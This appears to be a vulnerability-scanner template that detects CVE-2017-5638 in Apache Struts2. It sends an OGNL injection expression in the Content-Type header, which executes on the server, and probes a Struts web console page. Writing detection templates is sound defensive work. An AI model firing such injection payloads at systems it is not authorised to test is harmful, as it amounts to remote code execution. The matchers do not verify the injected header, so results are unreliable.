id: CVE-2017-5638
name: "Apache Struts2 Jakarta Multipart Parser RCE"
severity: critical
description: "Apache Struts2 Jakarta Multipart parser allows RCE via crafted Content-Type header using OGNL injection."
reference: CWE-20
confidence: tentative
requests:
  - method: GET
    path: "/"
    headers:
      Content-Type: "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Test','vulnerable')}.multipart/form-data"
    matchers:
      - type: body
        words:
          - "Struts"
          - "struts"
      - type: status
        status: [200, 302, 400, 500]
    condition: and
  - method: GET
    path: "/struts/webconsole.html"
    matchers:
      - type: body
        words:
          - "OGNL"
      - type: status
        status: [200]
    condition: and
